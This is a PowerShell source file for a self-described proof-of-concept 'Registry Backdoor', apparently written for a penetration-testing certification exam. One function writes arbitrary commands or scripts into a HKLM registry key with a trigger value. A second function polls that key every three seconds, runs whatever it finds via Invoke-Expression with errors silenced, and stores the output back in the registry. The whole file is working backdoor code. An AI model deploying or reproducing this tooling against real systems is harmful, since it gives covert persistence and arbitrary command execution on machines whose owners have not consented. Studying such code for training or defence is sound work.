function Registry-Backdoor{
<#

.SYNOPSIS
This PowerShell script is a Registry PoC Backdoor
.DESCRIPTION
This PowerShell script is a PoC Backdoor which reads instructions/scripts from registry,  could be triggered by creation of another registry key and stores the output back to Registry.
 
.PARAMTER command
The command you want to store in registry

.PARAMTER powershell_script
The powershell script you want to store in registry

.EXAMPLE
PS C:\> . .\Registry-Backdoor.ps1
PS C:\> Registry-Backdoor
PS C:\> Registry-Backdoor -command "dir c:\"
PS C:\> Registry-Backdoor -powershell_script .\somescript.ps1

.LINK
https://docs.microsoft.com/en-us/powershell/scripting/getting-started/cookbooks/working-with-registry-entries?view=powershell-6

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam.
" http://www.securitytube-training.com/online-courses/powershell-for-pentesters/ "
Student ID: PSP - 3224
#>

    param(
    [parameter(Mandatory = $false)]
    [string]
    $command,

    [parameter(Mandatory = $false)]
    [string]
    $powershell_script

    )


    $ErrorActionPreference = 'SilentlyContinue'

    # Creating Registry Key
    $testpath = Test-Path "HKLM:\SOFTWARE\POC"
    if (!$testpath){
        $newkey = New-Item -Path "HKLM:\SOFTWARE\POC"
    }
    if ($command){
        #Creating property for the key with the command
        $create = New-ItemProperty -path HKLM:\SOFTWARE\POC\ -Name command -PropertyType String -Value $command
        if (!$create) {
	        set-ItemProperty -path HKLM:\SOFTWARE\POC\ -Name command -Value $command
        }
        #create a trigger key
        $create_trigger = New-ItemProperty -path HKLM:\SOFTWARE\POC\ -Name TriggerCommand -PropertyType String -Value "command loaded"
        if (!$create_trigger) {
	        set-ItemProperty -path HKLM:\SOFTWARE\POC\ -Name TriggerCommand -Value "command loaded"
        }
        Write-Host "Command stored in registry" -ForegroundColor Green
        }

    elseif ($powershell_script) {
        #get script content as string
        $script_str = Get-Content $powershell_script | out-string
        #Creating property for the key with the script content
        $create = New-ItemProperty -path HKLM:\SOFTWARE\POC\ -Name script -PropertyType String -Value $script_str
        if (!$create) {
	        set-ItemProperty -path HKLM:\SOFTWARE\POC\ -Name script -Value $script_str
        }
        #create a trigger key
        $create_trigger = New-ItemProperty -path HKLM:\SOFTWARE\POC\ -Name TriggerScript -PropertyType String -Value "script loaded"
        if (!$create_trigger) {
	        set-ItemProperty -path HKLM:\SOFTWARE\POC\ -Name TriggerScript -Value "script loaded"
        }
        Write-Host "Powershell Script stored in registry" -ForegroundColor Green
        }

    else{
        Write-Host "Please choose -powershell_script or -command"
        }
}


function Activate-RegistryBackdoor
{
    $ErrorActionPreference = 'SilentlyContinue'
    while($true){
        Start-Sleep -Seconds 3
        $testpath = Test-Path "HKLM:\SOFTWARE\POC\"
        if ($testpath){
            $GetInstruction = Get-ItemProperty HKLM:\SOFTWARE\POC\
            $readInstructionCMD =($GetInstruction).TriggerCommand
            if ($readInstructionCMD){
                #Reading property
                $regcmd = Get-ItemProperty "HKLM:\SOFTWARE\POC\"
                #Reading the command from output
                $exec_cmd = ($regcmd).command

                #execute the command from registry
                $cmd_output = Invoke-Expression $exec_cmd

                #upload output to registry
                $create_output = New-ItemProperty -path HKLM:\SOFTWARE\POC\ -Name output -PropertyType String -Value $cmd_output
                if (!$create_output) {
	                set-ItemProperty -path HKLM:\SOFTWARE\POC\ -Name output -Value $cmd_output
                }
                $removeTrigger = Remove-ItemProperty -Path HKLM:\SOFTWARE\POC\ -Name TriggerCommand

                #printing output
                $reg_output = Get-ItemProperty "HKLM:\SOFTWARE\POC\"
                Write-Host "## Command OUTPUT ##" -ForegroundColor Green
                ($reg_output).output
            }

            $readInstructionScript =($GetInstruction).TriggerScript
            if ($readInstructionScript){
                    #Reading property
                    $reg_output = Get-ItemProperty "HKLM:\SOFTWARE\POC\"
                    #Reading the script from output
                    $script_reg = ($reg_output).script
                    Write-Host "## Script OUTPUT ##" -ForegroundColor Green
                    #Execute the script
                    Invoke-Expression $script_reg
                    $removeTrigger = Remove-ItemProperty -Path HKLM:\SOFTWARE\POC\ -Name TriggerScript
        }
     }
  }
}